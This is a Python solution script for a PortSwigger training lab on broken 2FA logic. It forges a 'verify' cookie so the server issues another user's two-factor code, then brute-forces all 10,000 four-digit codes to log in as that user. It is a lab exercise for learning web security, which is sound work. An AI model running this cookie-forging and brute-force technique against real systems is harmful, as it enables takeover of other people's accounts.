# Lab 08 — 2FA broken logic
# PortSwigger: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
#
# Vulnerability: The 2FA code is tied to a 'verify' cookie — changing this
#                cookie to carlos generates a code FOR carlos, which can be
#                brute-forced without ever knowing carlos's password
# Aim:           Log in as carlos by brute-forcing his 2FA code
#
# Technique:
#   1. Log in as wiener → GET /login2 carries verify=wiener cookie
#   2. GET /login2 with verify=carlos → server generates a 2FA code for carlos
#   3. Brute-force POST /login2 with verify=carlos and mfa-code 0000–9999
#   4. 302 response → use that session to access /my-account
#
# Usage: python authentication_lab08.py <url>

import sys
import urllib3
from proxies import proxies
from authentication_utils import (banner, section, make_session, get_csrf_from_response,
                                   login, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def generate_carlos_code(session, url):
    """Send GET /login2 with verify=carlos to make the server issue his code."""
    r = session.get(
        f"{url}/login2",
        cookies={"verify": "carlos"},
        allow_redirects=False
    )
    print(f"  ℹ  GET /login2 with verify=carlos → status {r.status_code}")


def brute_force_2fa(session, url):
    print(f"\n  ➜  Brute-forcing mfa-code 0000–9999 for carlos...\n")
    for code_int in range(10000):
        code = f"{code_int:04d}"

        login2_page = session.get(
            f"{url}/login2",
            cookies={"verify": "carlos"}
        )
        csrf = get_csrf_from_response(login2_page.text)

        data = {"mfa-code": code}
        if csrf:
            data["csrf"] = csrf

        r = session.post(
            f"{url}/login2",
            data=data,
            cookies={"verify": "carlos"},
            allow_redirects=False
        )

        if r.status_code == 302:
            print(f"  ✔  Valid 2FA code found: {code}")
            return code, r.cookies

        if code_int % 500 == 0:
            print(f"  ·  {code_int}/9999 tried...")

    return None, None


if __name__ == "__main__":
    banner()
    section("LAB 08 — 2FA BROKEN LOGIC (verify COOKIE MANIPULATION)")

    if len(sys.argv) != 2:
        print("  Usage: python authentication_lab08.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: log in as wiener to establish a session ──────────────────────
    print("\n  ── Step 1: log in as wiener to establish a base session\n")
    if not login(session, url):
        sys.exit(1)

    # ── Step 2: trigger 2FA code generation for carlos ───────────────────────
    print("\n  ── Step 2: generate a 2FA code for carlos via verify cookie\n")
    generate_carlos_code(session, url)

    # ── Step 3: brute-force the code ─────────────────────────────────────────
    section("Step 3: Brute-Force 2FA Code for carlos")
    valid_code, cookies = brute_force_2fa(session, url)

    if not valid_code:
        print("  ✘  2FA code not found in 0000–9999 range")
        sys.exit(1)

    # ── Step 4: use the session from the 302 to access /my-account ───────────
    print("\n  ── Step 4: access /my-account using the authenticated session\n")
    r = session.get(f"{url}/my-account", allow_redirects=True)
    check_status(r, 200, "GET /my-account as carlos")

    if "carlos" in r.text or "Log out" in r.text:
        print_box("SUCCESS", f"2FA code: {valid_code}\nLogged in as carlos")
    else:
        print("  ?  Page loaded but ownership unclear — check the session cookie in browser")
        print("     Right-click the 302 response in Burp → 'Show response in browser'")
